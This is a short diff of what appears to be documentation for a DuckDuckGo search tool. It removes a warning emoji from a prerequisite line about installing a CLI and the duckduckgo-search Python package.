@@ -8,7 +8,7 @@ license: Proprietary
 
 Search the web using DuckDuckGo's API. Supports web pages, news articles, images, and videos with customizable filtering and output formats.
 
-⚠️ **Prerequisite:** Install [OpenClawCLI](https://clawhub.ai/) (Windows, MacOS) and run `pip install duckduckgo-search`
+ **Prerequisite:** Install [OpenClawCLI](https://clawhub.ai/) (Windows, MacOS) and run `pip install duckduckgo-search`
 
 **Installation Best Practices:**
 - If you encounter permission errors, use a virtual environment instead of system-wide installation
